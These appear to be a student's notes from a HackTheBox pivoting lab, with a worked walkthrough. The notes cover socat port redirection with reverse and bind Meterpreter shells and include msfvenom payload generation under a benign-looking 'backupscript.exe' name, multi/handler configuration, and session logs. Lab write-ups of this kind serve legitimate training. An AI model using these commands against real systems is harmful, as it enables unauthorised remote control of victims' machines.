# Socat Redirection with a Reverse Shell
#### Starting Socat Listener

```bash
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
#### Creating the Windows Payload

```bash
Yashfren@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```
#### Starting MSF Console

```bash
Yashfren@htb[/htb]$ sudo msfconsole
```
#### Configuring & Starting the multi/handler

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```
#### Establishing the Meterpreter Session

```bash
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```
# Socat Redirection with a Bind Shell 
## FIRST RDP, THEN SOCAT IN UBUNTU@WEBSERVER AND THEN AT THE END METASPLOIT METERPRETER BIND_TCP MULTI HANDLER THING
#### Creating the Windows Payload 

```bash
Yashfren@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.
#### Starting Socat Bind Shell Listener

```bash
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
#### Configuring & Starting the Bind multi/handler

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
#### Establishing Meterpreter Session

```bash
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

--- 
# PRACTICAL BIND SHELL

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o bindbackupscript.exe LPORT=8443
```

```powershell-session
.\bindbackupscript.exe
```

```bash
ubuntu@WEB01:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:9001
2025/05/30 20:28:56 socat[3645] E connect(5, AF=2 172.16.5.19:9001, 16): Connection refused
2025/05/30 20:28:56 socat[3646] E connect(5, AF=2 172.16.5.19:9001, 16): Connection refused
2025/05/30 20:28:56 socat[3647] E connect(5, AF=2 172.16.5.19:9001, 16): Connection refused
2025/05/30 20:28:56 socat[3648] E connect(5, AF=2 172.16.5.19:9001, 16): Connection refused
^Cubuntu@WEB01:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
2025/05/30 20:29:03 socat[3651] E bind(5, {AF=2 0.0.0.0:8080}, 16): Address already in use
ubuntu@WEB01:~$ ^C
ubuntu@WEB01:~$ socat TCP4-LISTEN:8081,fork TCP4:172.16.5.19:8443
```

```bash
┌──(apu㉿frenbook)-[~/PTPF]
└─$ sudo msfconsole -q                              
[sudo] password for apu: 
Sorry, try again.
[sudo] password for apu: 
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.134.95
RHOST => 10.129.134.95
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > set LPORT 8081
LPORT => 8081
msf6 exploit(multi/handler) > run
[*] Started bind TCP handler against 10.129.134.95:8081
[*] Sending stage (203846 bytes) to 10.129.134.95
[*] Meterpreter session 1 opened (10.10.16.251:34041 -> 10.129.134.95:8081) at 2025-05-31 01:59:39 +0530

meterpreter >
```